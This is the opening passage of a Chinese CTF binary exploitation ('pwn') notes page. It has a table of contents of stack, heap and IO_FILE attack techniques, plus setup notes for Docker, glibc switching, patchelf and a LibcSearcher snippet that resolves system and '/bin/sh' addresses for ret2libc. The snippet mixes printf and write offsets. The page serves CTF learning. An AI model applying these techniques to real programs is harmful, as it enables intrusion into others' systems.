<!doctype html><html lang=zh-CN><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>PWN - J-shiro's Blog</title><meta name=Description content="Hugo theme - LoveIt"><meta property="og:url" content="https://j-shiro.github.io/pwn_note/">
<meta property="og:site_name" content="J-shiro's Blog"><meta property="og:title" content="PWN"><meta property="og:description" content="工具 Docker docker pull xxx/xxx:last # 拉取docker镜像 docker images # 查看镜像 docker rmi <CONTAINER IMAGE ID> # 删除镜像 docker start <CONTAINER ID> # 开启容器 docker stop <CONTAINER ID> # 关闭容器 docker ps -a # 查看容器 docker rm -f <CONTAINER ID> # 删除容器 生成容器"><meta property="og:locale" content="zh_CN"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-10-09T00:00:00+00:00"><meta property="article:modified_time" content="2025-05-24T19:40:01+08:00"><meta property="article:tag" content="Pwn"><meta property="og:image" content="https://j-shiro.github.io/logo.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://j-shiro.github.io/logo.png"><meta name=twitter:title content="PWN"><meta name=twitter:description content="工具 Docker docker pull xxx/xxx:last # 拉取docker镜像 docker images # 查看镜像 docker rmi <CONTAINER IMAGE ID> # 删除镜像 docker start <CONTAINER ID> # 开启容器 docker stop <CONTAINER ID> # 关闭容器 docker ps -a # 查看容器 docker rm -f <CONTAINER ID> # 删除容器 生成容器"><meta name=application-name content="LoveIt"><meta name=apple-mobile-web-app-title content="LoveIt"><meta name=referrer content="no-referrer"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://j-shiro.github.io/pwn_note/><link rel=prev href=https://j-shiro.github.io/reverse_note/><link rel=next href=https://j-shiro.github.io/misc_note/><link rel=stylesheet href=/css/style.min.css><link rel=preload href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css></noscript><link rel=preload href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"PWN","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/j-shiro.github.io\/pwn_note\/"},"image":["https:\/\/j-shiro.github.io\/images\/Apple-Devices-Preview.png"],"genre":"posts","keywords":"pwn","wordcount":86202,"url":"https:\/\/j-shiro.github.io\/pwn_note\/","datePublished":"2024-10-09T00:00:00+00:00","dateModified":"2025-05-24T19:40:01+08:00","license":"This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher":{"@type":"Organization","name":"xxxx","logo":{"@type":"ImageObject","url":"https:\/\/j-shiro.github.io\/images\/avatar.png","width":800,"height":800}},"author":{"@type":"Person","name":"jshiro"},"description":""}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"auto"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"auto"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title="J-shiro's Blog"><span class=header-title-pre><i class='far fa-kiss-wink-heart fa-fw' aria-hidden=true></i></span>LoveIt</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>所有文章 </a><a class=menu-item href=/tags/>标签 </a><a class=menu-item href=/categories/>分类 </a><a class=menu-item href=/categories/documentation/>文档 </a><a class=menu-item href=/about/>关于 </a><a class=menu-item href=https://github.com/dillonzq/LoveIt title=GitHub rel="noopener noreffer" target=_blank><i class='fab fa-github fa-fw' aria-hidden=true></i> </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
<input type=text placeholder=搜索文章标题或内容... id=search-input-desktop>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=搜索><i class="fas fa-search fa-fw" aria-hidden=true></i>
</a><a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=清空><i class="fas fa-times-circle fa-fw" aria-hidden=true></i>
</a><span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i>
</span></span><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题><i class="fas fa-adjust fa-fw" aria-hidden=true></i>
</a><a href=javascript:void(0); class="menu-item language" title=选择语言><i class="fa fa-globe fa-fw" aria-hidden=true></i>
<select class=language-select id=language-select-desktop onchange="location=this.value"><option value=/pwn_note/ selected>简体中文</option></select></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="J-shiro's Blog"><span class=header-title-pre><i class='far fa-kiss-wink-heart fa-fw' aria-hidden=true></i></span>LoveIt</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder=搜索文章标题或内容... id=search-input-mobile>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=搜索><i class="fas fa-search fa-fw" aria-hidden=true></i>
</a><a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=清空><i class="fas fa-times-circle fa-fw" aria-hidden=true></i>
</a><span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>取消</a></div><a class=menu-item href=/posts/ title>所有文章</a><a class=menu-item href=/tags/ title>标签</a><a class=menu-item href=/categories/ title>分类</a><a class=menu-item href=/categories/documentation/ title>文档</a><a class=menu-item href=/about/ title>关于</a><a class=menu-item href=https://github.com/dillonzq/LoveIt title=GitHub rel="noopener noreffer" target=_blank><i class='fab fa-github fa-fw' aria-hidden=true></i></a><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题>
<i class="fas fa-adjust fa-fw" aria-hidden=true></i>
</a><a href=javascript:void(0); class=menu-item title=选择语言><i class="fa fa-globe fa-fw" aria-hidden=true></i>
<select class=language-select onchange="location=this.value"><option value=/pwn_note/ selected>简体中文</option></select></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>目录</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">PWN</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw" aria-hidden=true></i>jshiro</a></span>&nbsp;<span class=post-category>收录于 <a href=/categories/notes/><i class="far fa-folder fa-fw" aria-hidden=true></i>Notes</a>&nbsp;<a href=/categories/ctf/><i class="far fa-folder fa-fw" aria-hidden=true></i>CTF</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw" aria-hidden=true></i>&nbsp;<time datetime=2024-10-09>2024-10-09</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden=true></i>&nbsp;约 86202 字&nbsp;
<i class="far fa-clock fa-fw" aria-hidden=true></i>&nbsp;预计阅读 173 分钟&nbsp;<span id=/pwn_note/ class=leancloud_visitors data-flag-title=PWN>
<i class="far fa-eye fa-fw" aria-hidden=true></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;次阅读
</span>&nbsp;</div></div><div class="details toc" id=toc-static data-kept><div class="details-summary toc-title"><span>目录</span>
<span><i class="details-icon fas fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#工具>工具</a><ul><li><a href=#docker>Docker</a></li><li><a href=#pwndocker>Pwndocker</a></li><li><a href=#checksec>checksec</a></li><li><a href=#glibc-all-in-one>Glibc-all-in-one</a></li><li><a href=#libcsearcher>LibcSearcher</a></li><li><a href=#patchelf>Patchelf</a></li><li><a href=#seccomp-tools>seccomp-tools</a></li><li><a href=#tmux>tmux</a></li><li><a href=#ropper>ropper</a></li><li><a href=#ida>IDA</a></li><li><a href=#pwntools>pwntools</a></li><li><a href=#gdb>gdb</a></li><li><a href=#pwndbg>pwndbg</a></li><li><a href=#pwngdb>Pwngdb</a></li><li><a href=#gdb-dashboard>gdb-dashboard</a></li><li><a href=#ropgadget>ROPgadget</a></li><li><a href=#one_gadget>one_gadget</a></li><li><a href=#vscode>VSCODE</a></li><li><a href=#git>git</a></li><li><a href=#linux>Linux</a></li><li><a href=#libc-database>libc-database</a></li><li><a href=#debuginfod>debuginfod</a></li></ul></li><li><a href=#基础知识>基础知识</a><ul><li><a href=#计组>计组</a></li><li><a href=#glibc>Glibc</a></li><li><a href=#mips>Mips</a></li><li><a href=#assembly>Assembly</a></li><li><a href=#c>C</a></li><li><a href=#c-1>C++</a></li><li><a href=#python>Python</a></li><li><a href=#保护措施>保护措施</a></li><li><a href=#问题解决>问题解决</a></li><li><a href=#出题>出题</a></li></ul></li><li><a href=#elf-文件>ELF 文件</a></li><li><a href=#共享库>共享库</a></li><li><a href=#进程>进程</a><ul><li><a href=#编译>编译</a></li><li><a href=#链接>链接</a><ul><li><a href=#静态链接>静态链接</a></li><li><a href=#动态链接>动态链接</a></li></ul></li><li><a href=#装载>装载</a></li><li><a href=#执行>执行</a></li><li><a href=#虚拟空间>虚拟空间</a></li></ul></li><li><a href=#tls-结构体>TLS 结构体</a></li><li><a href=#终端处理>终端处理</a></li><li><a href=#随机数>随机数</a><ul><li><a href=#random>random</a></li><li><a href=#devrandom>/dev/random</a></li><li><a href=#arc4random>arc4random</a></li></ul></li><li><a href=#整数溢出漏洞>整数溢出漏洞</a></li><li><a href=#栈溢出漏洞>栈溢出漏洞</a><ul><li><a href=#栈基础>栈基础</a></li><li><a href=#oob>OOB</a></li><li><a href=#地址泄露>地址泄露</a></li><li><a href=#ret2text>ret2text</a></li><li><a href=#ret2shellcode>ret2shellcode</a></li><li><a href=#orw-bypass>orw bypass</a></li></ul></li><li><a href=#沙箱绕过>沙箱绕过</a><ul><li><a href=#seccomp>Seccomp</a></li><li><a href=#proc-泄露>/proc 泄露</a></li><li><a href=#ptrace-进程>Ptrace 进程</a></li></ul></li><li><a href=#canary-绕过>Canary 绕过</a><ul><li><a href=#ssp-leak>SSP Leak</a></li><li><a href=#逐字节爆破>逐字节爆破</a></li><li><a href=#劫持函数>劫持函数</a></li><li><a href=#覆盖初始值>覆盖初始值</a></li></ul></li><li><a href=#rop>ROP</a><ul><li><a href=#ret2syscall>ret2syscall</a></li><li><a href=#ret2libc>ret2libc</a></li><li><a href=#ret2csu>ret2csu</a></li><li><a href=#ret2dl-resolve>ret2dl-resolve</a></li><li><a href=#ret2vdso>ret2vdso</a></li><li><a href=#brop>BROP</a></li></ul></li><li><a href=#花式栈溢出>花式栈溢出</a><ul><li><a href=#栈迁移>栈迁移</a></li><li><a href=#srop>SROP</a></li><li><a href=#exit-hook>Exit Hook</a></li></ul></li><li><a href=#格式化字符串>格式化字符串</a><ul><li><a href=#任意地址读>任意地址读</a></li><li><a href=#任意地址写>任意地址写</a></li><li><a href=#非栈上-fmt>非栈上 fmt</a></li><li><a href=#其他>其他</a></li></ul></li><li><a href=#堆溢出漏洞>堆溢出漏洞</a><ul><li><a href=#堆管理器>堆管理器</a><ul><li><a href=#arena>arena</a></li><li><a href=#chunk>chunk</a></li><li><a href=#bin>bin</a><ul><li><a href=#unsorted-bin>Unsorted bin</a></li><li><a href=#fast-bins>Fast bins</a></li><li><a href=#tcache>Tcache</a></li><li><a href=#small-bins>Small bins</a></li><li><a href=#large-bins>Large bins</a></li></ul></li></ul></li><li><a href=#漏洞点>漏洞点</a><ul><li><a href=#unlink>Unlink</a></li><li><a href=#uaf>UAF</a></li><li><a href=#off-by-null>Off-by-null</a></li></ul></li><li><a href=#堆叠>堆叠</a><ul><li><a href=#uaf-1>UAF</a></li><li><a href=#off-by-one>off-by-one</a></li></ul></li><li><a href=#fast-bin-attack>fast bin attack</a><ul><li><a href=#double-free>Double Free</a></li><li><a href=#arbitrary-alloc>Arbitrary Alloc</a></li></ul></li><li><a href=#tcache-bin-attack>Tcache bin attack</a><ul><li><a href=#tcache-bypass>Tcache Bypass</a></li><li><a href=#tcache-poisoning>Tcache Poisoning</a></li><li><a href=#tcache-dup>Tcache Dup</a></li><li><a href=#tcache-extend>Tcache Extend</a></li><li><a href=#tcache-key-bypass>Tcache key Bypass</a></li><li><a href=#fastbin-reverse>Fastbin Reverse</a></li><li><a href=#tcache-stash-unlink>Tcache Stash Unlink</a></li><li><a href=#safe-linking-bypass>Safe-linking Bypass</a></li><li><a href=#mp_-attack>mp_ attack</a></li></ul></li><li><a href=#large-bin-attack>Large bin attack</a><ul><li><a href=#地址泄露-1>地址泄露</a></li><li><a href=#目标地址写大数>目标地址写大数</a></li></ul></li><li><a href=#unsorted-bin-attack>Unsorted bin attack</a><ul><li><a href=#地址泄露-2>地址泄露</a></li><li><a href=#任意地址写大数>任意地址写大数</a></li></ul></li><li><a href=#malloc_init_state_attack>malloc_init_state_attack</a></li><li><a href=#house-of>House of</a><ul><li><a href=#house-of-kauri>House of kauri</a></li><li><a href=#house-of-botcake>House of Botcake</a></li><li><a href=#house-of-io>House of IO</a></li><li><a href=#house-of-spirit>House of Spirit</a></li><li><a href=#house-of-roman>House of Roman</a></li><li><a href=#house-of-einherjar>House Of Einherjar</a></li><li><a href=#house-of-force>House of Force</a></li><li><a href=#house-of-rabbit>House of Rabbit</a></li><li><a href=#house-of-storm>House of Storm</a></li><li><a href=#house-of-lore>House Of Lore</a></li><li><a href=#house-of-gods>House of Gods</a></li><li><a href=#house-of-banana>House Of Banana</a></li><li><a href=#house-of-rust>House of Rust</a></li><li><a href=#house-of-muney>House of Muney</a></li><li><a href=#house-of-corrosion>House Of Corrosion</a></li><li><a href=#house-of-一骑当千>House of 一骑当千</a></li></ul></li></ul></li><li><a href=#setcontext>setcontext</a><ul><li><a href=#shellcode>shellcode</a></li><li><a href=#rop-1>ROP</a></li><li><a href=#new>New</a></li></ul></li><li><a href=#io_file>IO_FILE</a><ul><li><a href=#stdin-任意写>stdin 任意写</a></li><li><a href=#stdout-leak>stdout Leak</a></li><li><a href=#vtable-劫持>vtable 劫持</a><ul><li><a href=#223>2.23</a></li><li><a href=#224>2.24</a></li></ul></li><li><a href=#fsop>FSOP</a></li><li><a href=#house-of-1>House of</a><ul><li><a href=#house-of-orange>House of Orange</a><ul><li><a href=#step-1>Step 1</a></li><li><a href=#step-2>Step 2</a></li></ul></li><li><a href=#house-of-husk>House of Husk</a></li><li><a href=#house-of-kiwi>House of Kiwi</a></li><li><a href=#house-of-emma>House of Emma</a></li><li><a href=#house-of-pig>House of Pig</a><ul><li><a href=#glibc234>glibc&lt;2.34</a></li><li><a href=#glibc233>glibc>2.33</a></li></ul></li><li><a href=#house-of-apple>House of Apple</a><ul><li><a href=#house-of-apple1>House of Apple1</a></li><li><a href=#house-of-apple2>House of Apple2</a></li><li><a href=#house-of-apple3>House of Apple3</a></li></ul></li><li><a href=#house-of-obstack>House of Obstack</a></li><li><a href=#house-of-snake>House of Snake</a></li><li><a href=#house-of-魑魅魍魉>House of 魑魅魍魉</a></li></ul></li></ul></li><li><a href=#条件竞争>条件竞争</a><ul><li><a href=#double-fetch>Double Fetch</a></li></ul></li><li><a href=#musl-pwn>musl pwn</a><ul><li><a href=#环境>环境</a></li></ul></li><li><a href=#awd>AWD</a><ul><li><a href=#通防>通防</a></li></ul></li></ul></nav></div></div><div class=content id=content><h2 id=工具>工具</h2><h3 id=docker>Docker</h3><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>docker pull xxx/xxx:last <span class=c1># 拉取docker镜像</span>
</span></span><span class=line><span class=cl>docker images <span class=c1># 查看镜像</span>
</span></span><span class=line><span class=cl>docker rmi &lt;CONTAINER IMAGE ID&gt; <span class=c1># 删除镜像</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>docker start &lt;CONTAINER ID&gt; <span class=c1># 开启容器</span>
</span></span><span class=line><span class=cl>docker stop &lt;CONTAINER ID&gt;  <span class=c1># 关闭容器</span>
</span></span><span class=line><span class=cl>docker ps -a <span class=c1># 查看容器</span>
</span></span><span class=line><span class=cl>docker rm -f &lt;CONTAINER ID&gt; <span class=c1># 删除容器</span></span></span></code></pre></div></div><p><strong>生成容器</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl> sudo docker run -p 18022:22 -p 18080:80 -i -t author/test:last bash -c <span class=s1>&#39;/etc/rc.local; /bin/bash&#39;</span></span></span></code></pre></div></div><ol><li><code>sudo docker run</code>：运行 Docker 容器。</li><li><code>-p 18022:22</code>：将容器内的 SSH 服务绑定到主机的 18022 端口，以便可以通过 SSH 连接到容器内</li><li><code>-p 18080:80</code>：将容器内的 Web 服务绑定到主机的 18080 端口，以便可以通过 Web 浏览器访问容器内的 Web 应用程序</li><li><code>-i -t</code>：以交互式和伪终端的方式运行容器。</li><li><code>author/test:last</code>：使用 author/test:last 镜像作为容器的基础镜像</li><li><code>bash -c '/etc/rc.local; /bin/bash'</code>：在容器内执行两个命令，分别为执行<code>/etc/rc.local</code>和启动一个交互式的 Bash 终端(<code>/bin/bash</code>)</li><li><code>--name</code>：容器命名</li></ol><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>docker attach ID <span class=c1># 离开容器，容器停止</span>
</span></span><span class=line><span class=cl>docker <span class=nb>exec</span> -it ID /bin/bash <span class=c1># 离开容器，容器仍运行</span></span></span></code></pre></div></div><h3 id=pwndocker>Pwndocker</h3><p>使用：</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>docker</span><span class=o>-</span><span class=n>compose</span> <span class=n>up</span> <span class=o>-</span><span class=n>d</span>
</span></span><span class=line><span class=cl><span class=n>docker</span> <span class=n>exec</span> <span class=o>-</span><span class=n>it</span> <span class=n>pwn_test</span> <span class=o>/</span><span class=nb>bin</span><span class=o>/</span><span class=n>bash</span></span></span></code></pre></div></div><p>docker 与主机传文件</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>docker ps -a <span class=c1>#查看CONTAINER ID 或 NAMES</span>
</span></span><span class=line><span class=cl>docker inspect -f <span class=s1>&#39;{{.Id}}&#39;</span> NAMES <span class=c1>#根据ID或NAMES拿到ID全称</span>
</span></span><span class=line><span class=cl>docker cp 本地文件路径 ID全称:容器路径</span></span></code></pre></div></div><p><strong>在自定义 libc 版本中运行</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>cp</span> <span class=o>/</span><span class=n>glibc</span><span class=o>/</span><span class=mf>2.27</span><span class=o>/</span><span class=mi>64</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>ld</span><span class=o>-</span><span class=mf>2.27</span><span class=o>.</span><span class=n>so</span> <span class=o>/</span><span class=n>tmp</span><span class=o>/</span><span class=n>ld</span><span class=o>-</span><span class=mf>2.27</span><span class=o>.</span><span class=n>so</span>
</span></span><span class=line><span class=cl><span class=n>patchelf</span> <span class=o>--</span><span class=nb>set</span><span class=o>-</span><span class=n>interpreter</span> <span class=o>/</span><span class=n>tmp</span><span class=o>/</span><span class=n>ld</span><span class=o>-</span><span class=mf>2.27</span><span class=o>.</span><span class=n>so</span> <span class=o>./</span><span class=n>test</span>
</span></span><span class=line><span class=cl><span class=n>LD_PRELOAD</span><span class=o>=./</span><span class=n>libc</span><span class=o>.</span><span class=n>so</span><span class=mf>.6</span> <span class=o>./</span><span class=n>test</span></span></span></code></pre></div></div><p>或</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>([</span><span class=s2>&#34;/path/to/ld.so&#34;</span><span class=p>,</span> <span class=s2>&#34;./test&#34;</span><span class=p>],</span> <span class=n>env</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;LD_PRELOAD&#34;</span><span class=p>:</span><span class=s2>&#34;/path/to/libc.so.6&#34;</span><span class=p>})</span></span></span></code></pre></div></div><h3 id=checksec>checksec</h3><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>checksec --file<span class=o>={</span>file_name<span class=o>}</span></span></span></code></pre></div></div><h3 id=glibc-all-in-one>Glibc-all-in-one</h3><p>多版本 libc</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>./libc-x.xx.so <span class=c1># 查看相应版本的链接器</span>
</span></span><span class=line><span class=cl><span class=nb>cd</span> glibc-all-in-one
</span></span><span class=line><span class=cl>cat list or cat old_list
</span></span><span class=line><span class=cl>sudo ./download x.xx-xubuntux_amd64 <span class=c1>#下载glibc，会存放在libs文件夹中</span>
</span></span><span class=line><span class=cl>sudo ./download_old x.xx-xubuntux_xxx <span class=c1>#下载old_list中的</span></span></span></code></pre></div></div><p>若无法下载，可以进入官网（<a href=http://old-releases.ubuntu.com/ubuntu/pool/main/g/glibc/ target=_blank rel="noopener noreffer">ubuntu</a>、<a href=https://mirrors.tuna.tsinghua.edu.cn/ubuntu/pool/main/g/glibc/ target=_blank rel="noopener noreffer">清华镜像</a>）找到 deb 文件自行下载下来拷贝到 debs 文件夹中，libs 相应文件中创建<code>.debug</code>文件，执行：</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>sudo ./extract debs/libc6_x.xx-0ubuntu5_amd64.deb libs/x.xx-0ubuntu5_amd64/
</span></span><span class=line><span class=cl>sudo ./extract ~/libc6-dbg_2.26-0ubuntu2_i386.deb libs/x.xx-0ubuntu5_amd64/.debug/</span></span></code></pre></div></div><h3 id=libcsearcher>LibcSearcher</h3><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>LibcSearcher</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>LibcSearcher</span><span class=p>(</span><span class=s2>&#34;printf&#34;</span><span class=p>,</span> <span class=n>printf_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc_base</span> <span class=o>=</span> <span class=n>write_addr</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>dump</span><span class=p>(</span><span class=s2>&#34;write&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>system_addr</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>dump</span><span class=p>(</span><span class=s2>&#34;system&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>binsh_addr</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>dump</span><span class=p>(</span><span class=s2>&#34;str_binsh&#34;</span><span class=p>)</span></span></span></code></pre></div></div><h3 id=patchelf>Patchelf</h3><p>若无相应链接将会产生错误</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>./pwn: /lib/x86_64-linux-gnu/libc.so.6: version <span class=sb>`</span>GLIBC_2.34<span class=err>&#39;</span> not found <span class=o>(</span>required by ./pwn<span class=o>)</span></span></span></code></pre></div></div><p>一般情况</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>jshiro@ubuntu:~/Desktop/ctf/smashes$ ldd ./elf
</span></span><span class=line><span class=cl>        linux-vdso.so.1 <span class=o>(</span>0x00007fff3c996000<span class=o>)</span>
</span></span><span class=line><span class=cl>        libc.so.6 <span class=o>=</span>&gt; /lib/x86_64-linux-gnu/libc.so.6 <span class=o>(</span>0x00007fb20380c000<span class=o>)</span>
